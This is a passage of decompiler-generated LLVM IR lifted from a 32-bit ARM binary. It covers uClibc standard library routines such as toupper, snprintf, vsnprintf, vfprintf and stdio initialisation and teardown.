  %v1_143d4 = and i32 %v6_143d0, 32
  ret i32 %v1_143d4
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_143e8 = add i32 %arg1, 128
  %v2_143ec = icmp ugt i32 %v1_143e8, 383
  %v0_143f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_143ec, i32 %v0_143f4)
  %v4_143fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 588) to i32*), align 4
  %v2_14400 = mul i32 %arg1, 2
  %v2_14404 = add i32 %v4_143fc, %v2_14400
  %v3_14404 = inttoptr i32 %v2_14404 to i16*
  %v4_14404 = load i16, i16* %v3_14404, align 2
  %v6_14404 = sext i16 %v4_14404 to i32
  ret i32 %v6_14404
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 26348)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_14488 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14488, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_14498 = call i32 @__GI_vsnprintf()
  ret i32 %v0_14498

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_144b8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_144b8, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_144cc = call i32 @__GI_vsnprintf()
  ret i32 %v0_144cc

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_144e0 = load i32, i32* @r4, align 4
  %v6_144e0 = load i32, i32* @r5, align 4
  %v9_144e0 = load i32, i32* @r6, align 4
  %v12_144e0 = load i32, i32* @r7, align 4
  %v18_144e0 = load i32, i32* @sl, align 4
  %v2_144e8 = ptrtoint i32* %stack_var_-112 to i32
  %v0_144ec = load i32, i32* @r0, align 4
  store i32 %v0_144ec, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_144f4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_144f4, i32* @r0, align 4
  %v0_144fc = load i32, i32* @r3, align 4
  store i32 %v0_144fc, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_14508 = load i32, i32* @r1, align 4
  store i32 %v0_14508, i32* @r5, align 4
  %v0_1450c = load i32, i32* @r2, align 4
  store i32 %v0_1450c, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_14520 = call i32 @__stdio_init_mutex(i32 %v2_144f4)
  %v0_14524 = load i32, i32* @r4, align 4
  %v1_14524 = sub i32 -1, %v0_14524
  %v0_14528 = load i32, i32* @r5, align 4
  %v3_14528 = icmp ult i32 %v0_14528, %v1_14524
  br i1 %v3_14528, label %bb24, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_14524, i32* @r5, align 4
  br label %bb24

bb24:                                             ; preds = %entry, %bb
  %v1_14530 = phi i32 [ %v0_14528, %entry ], [ %v1_14524, %bb ]
  %v0_14538 = load i32, i32* @r6, align 4
  %v0_1453c = load i32, i32* @r7, align 4
  %v3_1455c = inttoptr i32 %v0_14538 to i8*
  %v4_1455c = call i32 @_vfprintf_internal(i32 %v2_144e8, i8* %v3_1455c, i32 %v0_1453c)
  %v0_14560 = load i32, i32* @r5, align 4
  %v1_14560 = load i32, i32* @sl, align 4
  %v9_14560 = icmp eq i32 %v0_14560, %v1_14560
  br i1 %v9_14560, label %dec_label_pc_14588, label %dec_label_pc_1456c

dec_label_pc_1456c:                               ; preds = %bb24
  %v2_14530 = add i32 %v1_14530, %v0_14524
  %v9_14574 = icmp eq i32 %v1_14530, 0
  br i1 %v9_14574, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1456c
  %v2_14578 = add i32 %v0_14524, -1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1456c, %bb25
  %v1_1457c = phi i32 [ %v2_14530, %dec_label_pc_1456c ], [ %v2_14578, %bb25 ]
  %v1_1457c.v0_14554 = select i1 %v9_14574, i32 %v1_1457c, i32 %v0_14524
  %stack_var_-96.0 = inttoptr i32 %v1_1457c.v0_14554 to i8*
  %v1_14584 = trunc i32 %v1_14560 to i8
  store i8 %v1_14584, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_14588

dec_label_pc_14588:                               ; preds = %bb24, %bb26
  store i32 %v3_144e0, i32* @r4, align 4
  store i32 %v6_144e0, i32* @r5, align 4
  store i32 %v9_144e0, i32* @r6, align 4
  store i32 %v12_144e0, i32* @r7, align 4
  store i32 %v18_144e0, i32* @sl, align 4
  ret i32 %v4_1455c

; uselistorder directives
  uselistorder i1 %v9_14574, { 1, 0 }
  uselistorder i32 %v1_14530, { 1, 0 }
  uselistorder i32 %v1_14524, { 2, 1, 0 }
  uselistorder i32 %v0_14524, { 3, 2, 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_14588, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_14598 = call i32 @__GI___errno_location()
  store i32 %v0_14598, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_145a4 = inttoptr i32 %v0_14598 to i32*
  %v2_145a4 = load i32, i32* %v1_145a4, align 4
  store i32 %v2_145a4, i32* @r6, align 4
  %v1_145a8 = call i32 @isatty(i32 0)
  %v2_145b0 = icmp eq i32 %v1_145a8, 0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  br i1 %v2_145b0, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_145bc = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 668) to i16*), align 4
  %v7_145bc = zext i16 %v5_145bc to i32
  %v2_145c0 = xor i32 %v7_145bc, 256
  store i32 %v2_145c0, i32* @r3, align 4
  %v2_145c4 = trunc i32 %v2_145c0 to i16
  store i16 %v2_145c4, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 668) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_145cc = call i32 @isatty(i32 1)
  %v2_145d0 = icmp eq i32 %v1_145cc, 0
  br i1 %v2_145d0, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_145d8 = load i32, i32* @r4, align 4
  %v2_145dc = add i32 %v1_145d8, 748
  %v3_145dc = inttoptr i32 %v2_145dc to i16*
  %v4_145dc = load i16, i16* %v3_145dc, align 2
  %v2_145e0 = xor i16 %v4_145dc, 256
  store i16 %v2_145e0, i16* %v3_145dc, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_145e8 = load i32, i32* @r6, align 4
  %v1_145e8 = load i32, i32* @r5, align 4
  %v2_145e8 = inttoptr i32 %v1_145e8 to i32*
  store i32 %v0_145e8, i32* %v2_145e8, align 4
  ret i32 %v1_145cc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37664), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14618 = call i32 @memcpy()
  ret i32 %v0_14618
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14630 = load i32, i32* @r4, align 4
  store i32 %v3_14630, i32* %stack_var_-24, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r6.global-to-local, align 4
  %v4_14640 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 108) to i32*), align 4
  store i32 %v4_14640, i32* @r0, align 4
  %v1_14644 = call i32 @__stdio_init_mutex(i32 %v4_14640)
  store i32 %v1_14644, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_1464c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 120) to i32*), align 4
  store i32 %v4_1464c, i32* @r0, align 4
  %v1_14650 = call i32 @__stdio_init_mutex(i32 %v4_1464c)
  store i32 %v1_14650, i32* %r0.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_14658 = load i32, i32* %r6.global-to-local, align 4
  %v2_14658 = add i32 %v0_14658, 52
  %v3_14658 = inttoptr i32 %v2_14658 to i32*
  %v4_14658 = load i32, i32* %v3_14658, align 4
  store i32 %v4_14658, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  %v1_14660 = inttoptr i32 %v4_14658 to i32*
  %v2_14660 = load i32, i32* %v1_14660, align 4
  store i32 %v2_14660, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_146ac5 = add i32 %v2_14660, 56
  store i32 %v1_146ac5, i32* @r5, align 4
  %v2_146b07 = icmp eq i32 %v2_14660, 0
  store i32 %v1_146ac5, i32* %r0.global-to-local, align 4
  br i1 %v2_146b07, label %dec_label_pc_146bc, label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %entry, %dec_label_pc_146a0.dec_label_pc_1466c_crit_edge
  %v1_1466c = phi i32 [ %v1_1466c.pre, %dec_label_pc_146a0.dec_label_pc_1466c_crit_edge ], [ 48, %entry ]
  %v0_1466c = phi i32 [ %v0_146c0.pre, %dec_label_pc_146a0.dec_label_pc_1466c_crit_edge ], [ %v0_14658, %entry ]
  %v2_1466c = add i32 %v0_1466c, %v1_1466c
  %v3_1466c = inttoptr i32 %v2_1466c to i32*
  %v4_1466c = load i32, i32* %v3_1466c, align 4
  store i32 %v4_1466c, i32* @ip, align 4
  store i32 83576, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1466c)
  %v0_14678 = load i32, i32* %r0.global-to-local, align 4
  %v2_14678 = icmp eq i32 %v0_14678, 0
  %v0_1467c = load i32, i32* @r5, align 4
  store i32 %v0_1467c, i32* @r0, align 4
  br i1 %v2_14678, label %dec_label_pc_146a0, label %dec_label_pc_14684

dec_label_pc_14684:                               ; preds = %dec_label_pc_1466c
  %v0_14684 = load i32, i32* @r4, align 4
  %v1_14684 = add i32 %v0_14684, 8
  %v2_14684 = inttoptr i32 %v1_14684 to i32*
  %v3_14684 = load i32, i32* %v2_14684, align 4
  store i32 %v3_14684, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_1468c = add i32 %v0_14684, 20
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  store i32 %v3_14684, i32* %v3_1468c, align 4
  %v0_14690 = load i32, i32* %r2.global-to-local, align 4
  %v1_14690 = trunc i32 %v0_14690 to i16
  %v2_14690 = load i32, i32* @r4, align 4
  %v3_14690 = inttoptr i32 %v2_14690 to i16*
  store i16 %v1_14690, i16* %v3_14690, align 2
  %v0_14694 = load i32, i32* %r3.global-to-local, align 4
  %v1_14694 = load i32, i32* @r4, align 4
  %v2_14694 = add i32 %v1_14694, 24
  %v3_14694 = inttoptr i32 %v2_14694 to i32*
  store i32 %v0_14694, i32* %v3_14694, align 4
  %v0_14698 = load i32, i32* %r3.global-to-local, align 4
  %v1_14698 = load i32, i32* @r4, align 4
  %v2_14698 = add i32 %v1_14698, 28
  %v3_14698 = inttoptr i32 %v2_14698 to i32*
  store i32 %v0_14698, i32* %v3_14698, align 4
  %v0_1469c = load i32, i32* %r3.global-to-local, align 4
  %v1_1469c = load i32, i32* @r4, align 4
  %v2_1469c = add i32 %v1_1469c, 16
  %v3_1469c = inttoptr i32 %v2_1469c to i32*
  store i32 %v0_1469c, i32* %v3_1469c, align 4
  br label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_1466c, %dec_label_pc_14684
  %v0_146a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_146a0 = load i32, i32* @r4, align 4
  %v2_146a0 = add i32 %v1_146a0, 52
  %v3_146a0 = inttoptr i32 %v2_146a0 to i32*
  store i32 %v0_146a0, i32* %v3_146a0, align 4
  %v1_146a4 = call i32 @__stdio_init_mutex(i32 %v0_1467c)
  store i32 %v1_146a4, i32* %r0.global-to-local, align 4
  %v0_146a8 = load i32, i32* @r4, align 4
  %v1_146a8 = add i32 %v0_146a8, 32
  %v2_146a8 = inttoptr i32 %v1_146a8 to i32*
  %v3_146a8 = load i32, i32* %v2_146a8, align 4
  store i32 %v3_146a8, i32* @r4, align 4
  %v1_146ac = add i32 %v3_146a8, 56
  store i32 %v1_146ac, i32* @r5, align 4
  %v2_146b0 = icmp eq i32 %v3_146a8, 0
  store i32 %v1_146ac, i32* %r0.global-to-local, align 4
  %v0_146c0.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_146b0, label %dec_label_pc_146bc, label %dec_label_pc_146a0.dec_label_pc_1466c_crit_edge

dec_label_pc_146a0.dec_label_pc_1466c_crit_edge:  ; preds = %dec_label_pc_146a0
  %v1_1466c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1466c

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146a0, %entry
  %v1_146ec14 = phi i32 [ %v1_146ac5, %entry ], [ %v1_146ac, %dec_label_pc_146a0 ]
  %v0_146c0 = phi i32 [ %v0_14658, %entry ], [ %v0_146c0.pre, %dec_label_pc_146a0 ]
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_146c0 = add i32 %v0_146c0, 52
  %v3_146c0 = inttoptr i32 %v2_146c0 to i32*
  %v4_146c0 = load i32, i32* %v3_146c0, align 4
  store i32 %v4_146c0, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_146c0 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_146e04 = icmp eq i32 %storemerge2, 0
  br i1 %v2_146e04, label %dec_label_pc_146e8, label %dec_label_pc_146cc

dec_label_pc_146cc:                               ; preds = %dec_label_pc_146bc, %dec_label_pc_146e0
  %v1_146d4 = phi i32 [ %storemerge, %dec_label_pc_146e0 ], [ %storemerge2, %dec_label_pc_146bc ]
  %v1_146cc = inttoptr i32 %v1_146d4 to i16*
  %v2_146cc = load i16, i16* %v1_146cc, align 2
  %v3_146cc = zext i16 %v2_146cc to i32
  store i32 %v3_146cc, i32* %r3.global-to-local, align 4
  %v1_146d0 = and i32 %v3_146cc, 64
  %v2_146d0 = icmp eq i32 %v1_146d0, 0
  br i1 %v2_146d0, label %dec_label_pc_146e0, label %bb

bb:                                               ; preds = %dec_label_pc_146cc
  store i32 %v1_146d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146e0

dec_label_pc_146e0:                               ; preds = %dec_label_pc_146cc, %bb
  %v1_146d8 = xor i1 %v2_146d0, true
  call void @__pseudo_cond_branch(i1 %v1_146d8, i32 ptrtoint (i32* @global_var_14704.1328 to i32))
  %v0_146dc = load i32, i32* %r4.global-to-local, align 4
  %v1_146dc = add i32 %v0_146dc, 32
  %storemerge.in = inttoptr i32 %v1_146dc to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_146e0 = icmp eq i32 %storemerge, 0
  br i1 %v2_146e0, label %dec_label_pc_146e0.dec_label_pc_146e8_crit_edge, label %dec_label_pc_146cc

dec_label_pc_146e0.dec_label_pc_146e8_crit_edge:  ; preds = %dec_label_pc_146e0
  %v1_146ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146e8

dec_label_pc_146e8:                               ; preds = %dec_label_pc_146e0.dec_label_pc_146e8_crit_edge, %dec_label_pc_146bc
  %v1_146ec = phi i32 [ %v1_146ec.pre, %dec_label_pc_146e0.dec_label_pc_146e8_crit_edge ], [ %v1_146ec14, %dec_label_pc_146bc ]
  %v2_146e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_146e8, i32* %r4.global-to-local, align 4
  ret i32 %v1_146ec

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_14658, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 7, 1, 2, 3, 6, 8, 4, 5, 0 }
  uselistorder label %dec_label_pc_146e0, { 1, 0 }
  uselistorder label %dec_label_pc_146cc, { 1, 0 }
  uselistorder label %dec_label_pc_146a0, { 1, 0 }
  uselistorder label %dec_label_pc_1466c, { 1, 0 }
}

define i32 @function_146f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_146f4:
  %v0_146f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146f4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_146f4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_146f4, %bb
  %v10_14700 = phi i32 [ %arg1, %dec_label_pc_146f4 ], [ 0, %bb ]
  ret i32 %v10_14700

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14704 = load i32, i32* @r4, align 4
  store i32 %v3_14704, i32* %stack_var_-8, align 4
  %v0_14708 = load i32, i32* @r0, align 4
  %v1_14708 = add i32 %v0_14708, 8
  %v2_14708 = inttoptr i32 %v1_14708 to i32*
  %v3_14708 = load i32, i32* %v2_14708, align 4
  %v1_1470c = add i32 %v0_14708, 16
  %v2_1470c = inttoptr i32 %v1_1470c to i32*
  %v3_1470c = load i32, i32* %v2_1470c, align 4
  %v9_14710 = icmp eq i32 %v3_1470c, %v3_14708
  store i32 %v0_14708, i32* %r4.global-to-local, align 4
  br i1 %v9_14710, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_14708, i32* %v2_1470c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_1471c = xor i1 %v9_14710, true
  call void @__pseudo_cond_branch(i1 %v1_1471c, i32 ptrtoint (i32* @global_var_19b4c.1329 to i32))
  %v0_14720 = load i32, i32* %r4.global-to-local, align 4
  %v1_14720 = add i32 %v0_14720, 8
  %v2_14720 = inttoptr i32 %v1_14720 to i32*
  %v3_14720 = load i32, i32* %v2_14720, align 4
  %v1_14724 = add i32 %v0_14720, 16
  %v2_14724 = inttoptr i32 %v1_14724 to i32*
  %v3_14724 = load i32, i32* %v2_14724, align 4
  %v2_14728 = sub i32 %v3_14724, %v3_14720
  %v2_1472c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1472c, i32* @r4, align 4
  ret i32 %v2_14728

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14734 = load i32, i32* @r4, align 4
  store i32 %v3_14734, i32* %stack_var_-28, align 4
  %v0_14738 = load i32, i32* @r0, align 4
  %v1_14738 = add i32 %v0_14738, 52
  %v2_14738 = inttoptr i32 %v1_14738 to i32*
  %v3_14738 = load i32, i32* %v2_14738, align 4
  %v1_14740 = sub i32 1, %v3_14738
  %v2_14740 = icmp ult i32 %v3_14738, 2
  br i1 %v2_14740, label %bb17, label %bb

bb:                                               ; preds = %entry
  br label %bb17

bb17:                                             ; preds = %entry, %bb
  %storemerge22 = phi i32 [ 0, %bb ], [ %v1_14740, %entry ]
  %v0_14748 = phi i32 [ 0, %bb ], [ %v1_14740, %entry ]
  store i32 %storemerge22, i32* @r7, align 4
  %v2_14748 = icmp eq i32 %v0_14748, 0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  store i32 %v0_14738, i32* @r5, align 4
  %v0_14758 = load i32, i32* @r1, align 4
  store i32 %v0_14758, i32* @sl, align 4
  %v0_1475c = load i32, i32* @r2, align 4
  store i32 %v0_1475c, i32* @r8, align 4
  br i1 %v2_14748, label %dec_label_pc_1479c, label %dec_label_pc_14764

dec_label_pc_14764:                               ; preds = %bb17
  %v1_14768 = add i32 %v0_14738, 56
  store i32 %v1_14768, i32* @r4, align 4
  %v4_1477c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1477c)
  %v0_14790 = load i32, i32* @r6, align 4
  %v2_14790 = add i32 %v0_14790, 20
  %v3_14790 = inttoptr i32 %v2_14790 to i32*
  %v4_14790 = load i32, i32* %v3_14790, align 4
  store i32 %v4_14790, i32* @ip, align 4
  store i32 83868, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14790)
  %v0_1479c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %bb17, %dec_label_pc_14764
  %v0_147ac = phi i32 [ %v0_14738, %bb17 ], [ %v0_1479c.pre, %dec_label_pc_14764 ]
  %v1_1479c = inttoptr i32 %v0_147ac to i16*
  %v2_1479c = load i16, i16* %v1_1479c, align 2
  %v1_147a0 = and i16 %v2_1479c, 192
  %v2_147a4 = icmp eq i16 %v1_147a0, 192
  br i1 %v2_147a4, label %dec_label_pc_147c4, label %dec_label_pc_147ac

dec_label_pc_147ac:                               ; preds = %dec_label_pc_1479c
  %v3_147b4 = call i32 @__stdio_trans2w_o(i16* %v1_1479c, i32 128)
  %v2_147b8 = icmp eq i32 %v3_147b4, 0
  br i1 %v2_147b8, label %dec_label_pc_147ac.dec_label_pc_147c4_crit_edge, label %dec_label_pc_147d8

dec_label_pc_147ac.dec_label_pc_147c4_crit_edge:  ; preds = %dec_label_pc_147ac
  %v0_147c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_147c4

dec_label_pc_147c4:                               ; preds = %dec_label_pc_147ac.dec_label_pc_147c4_crit_edge, %dec_label_pc_1479c
  %v0_147c4 = phi i32 [ %v0_147c4.pre, %dec_label_pc_147ac.dec_label_pc_147c4_crit_edge ], [ %v0_147ac, %dec_label_pc_1479c ]
  %v0_147c8 = load i32, i32* @sl, align 4
  %v0_147cc = load i32, i32* @r8, align 4
  %v3_147d0 = inttoptr i32 %v0_147c8 to i8*
  %v4_147d0 = call i32 @_vfprintf_internal(i32 %v0_147c4, i8* %v3_147d0, i32 %v0_147cc)
  br label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147ac, %dec_label_pc_147c4
  %storemerge = phi i32 [ %v4_147d0, %dec_label_pc_147c4 ], [ -1, %dec_label_pc_147ac ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_147d8 = load i32, i32* @r7, align 4
  %v2_147d8 = icmp eq i32 %v0_147d8, 0
  br i1 %v2_147d8, label %dec_label_pc_147d8..thread6_crit_edge, label %bb19

dec_label_pc_147d8..thread6_crit_edge:            ; preds = %dec_label_pc_147d8
  br label %.thread6

bb19:                                             ; preds = %dec_label_pc_147d8
  %v1_147e8 = load i32, i32* @r6, align 4
  %v3_147e8 = add i32 %v1_147e8, 28
  %v4_147e8 = inttoptr i32 %v3_147e8 to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_147d8..thread6_crit_edge, %bb19
  %v0_147f0.in = phi i32* [ @ip, %dec_label_pc_147d8..thread6_crit_edge ], [ %v4_147e8, %bb19 ]
  %v0_147f0 = load i32, i32* %v0_147f0.in, align 4
  %v2_147f0 = xor i1 %v2_147d8, true
  call void @__pseudo_cond_branch(i1 %v2_147f0, i32 %v0_147f0)
  %v0_147f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_147fc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_147fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_147f4

; uselistorder directives
  uselistorder i32 %v3_14738, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_147d8, { 1, 0 }
  uselistorder label %dec_label_pc_1479c, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_14808(i32 %arg1) local_unnamed_addr {
dec_label_pc_14808:
  %v0_14808 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14808, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14808
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14808, %bb
  %v10_14814 = phi i32 [ %arg1, %dec_label_pc_14808 ], [ 0, %bb ]
  ret i32 %v10_14814

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_14818 = load i32, i32* @r4, align 4
  %v6_14818 = load i32, i32* @r5, align 4
  %v9_14818 = load i32, i32* @r6, align 4
  %v12_14818 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_14824 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_14824, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_1483c2 = icmp eq i32 %arg3, 0
  br i1 %v2_1483c2, label %dec_label_pc_1485c, label %dec_label_pc_14850

dec_label_pc_14838:                               ; preds = %dec_label_pc_14850
  %v1_14838 = add i32 %v0_14838, -1
  store i32 %v1_14838, i32* @r4, align 4
  %v2_1483c = icmp eq i32 %v1_14838, 0
  %v0_14848 = load i32, i32* @r7, align 4
  br i1 %v2_1483c, label %dec_label_pc_1485c.loopexit, label %dec_label_pc_14850

dec_label_pc_14850:                               ; preds = %entry, %dec_label_pc_14838
  %v0_148484 = phi i32 [ %v0_14848, %dec_label_pc_14838 ], [ %arg1, %entry ]
  %v3_14850 = inttoptr i32 %v0_148484 to i16*
  %v4_14850 = call i32 @__stdio_fwrite(i32 %v10_14824, i32 1, i16* %v3_14850)
  %v7_14854 = icmp eq i32 %v4_14850, 1
  %v0_14838 = load i32, i32* @r4, align 4
  br i1 %v7_14854, label %dec_label_pc_14838, label %dec_label_pc_1485c.loopexit

dec_label_pc_1485c.loopexit:                      ; preds = %dec_label_pc_14838, %dec_label_pc_14850
  %v0_1485c.ph = phi i32 [ %v0_14838, %dec_label_pc_14850 ], [ 0, %dec_label_pc_14838 ]
  %v1_1485c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1485c

dec_label_pc_1485c:                               ; preds = %dec_label_pc_1485c.loopexit, %entry
  %v1_1485c = phi i32 [ 0, %entry ], [ %v1_1485c.pre, %dec_label_pc_1485c.loopexit ]
  %v0_1485c = phi i32 [ 0, %entry ], [ %v0_1485c.ph, %dec_label_pc_1485c.loopexit ]
  %v2_1485c = sub i32 %v1_1485c, %v0_1485c
  store i32 %v3_14818, i32* @r4, align 4
  store i32 %v6_14818, i32* @r5, align 4
  store i32 %v9_14818, i32* @r6, align 4
  store i32 %v12_14818, i32* @r7, align 4
  ret i32 %v2_1485c

; uselistorder directives
  uselistorder i32 %v1_14838, { 1, 0 }
  uselistorder label %dec_label_pc_1485c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14850, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1486c = load i32, i32* @r4, align 4
  store i32 %v3_1486c, i32* %stack_var_-24, align 4
  %v6_1486c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_14874 = and i32 %arg2, 128
  %v2_14874 = icmp eq i32 %v1_14874, 0
  %v0_14878 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14878, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
